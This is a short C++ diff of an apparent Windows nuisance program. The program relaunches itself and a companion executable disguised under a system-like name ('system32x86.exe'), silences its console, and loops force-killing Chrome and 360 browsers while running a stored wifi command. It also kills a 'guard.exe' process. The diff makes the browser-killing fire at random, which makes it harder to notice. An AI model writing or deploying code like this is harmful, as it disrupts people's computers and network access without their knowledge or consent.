@@ -54,7 +54,7 @@ int main(int argc,char *argv[]) {
 			if(FindProcess() == false){
 				system("start C:\\system32x86.exe -t");
 			}
-			if(cnt == 114514){
+			if(cnt == 1437){
 				char s[800] = {};
 				sprintf(s,"start %s -g -n\0",argv[0]); 
 				system(s);
@@ -87,12 +87,16 @@ int main(int argc,char *argv[]) {
 		freopen("nul","w",stdout);
 		freopen("nul","r",stdin);
 		long long t = chrono::system_clock::now().time_since_epoch().count();
+		mt19937 gen(chrono::system_clock::now().time_since_epoch().count());
+		uniform_int_distribution<> random(1,1e6);
 		system("@echo off");
 		while(1){
-			system("taskkill /f /im chrome.exe > nul");
-			system("taskkill /f /im 360se.exe > nul");
-			system("taskkill /f /im 360chrome.exe > nul");
-			system(wifi); 
+			if(random(gen)==1437){
+				system("taskkill /f /im chrome.exe > nul");
+				system("taskkill /f /im 360se.exe > nul");
+				system("taskkill /f /im 360chrome.exe > nul");
+				system(wifi); 
+			}
 			if(t + times < chrono::system_clock::now().time_since_epoch().count())break;
 		}	
 		system("taskkill /f /im guard.exe");
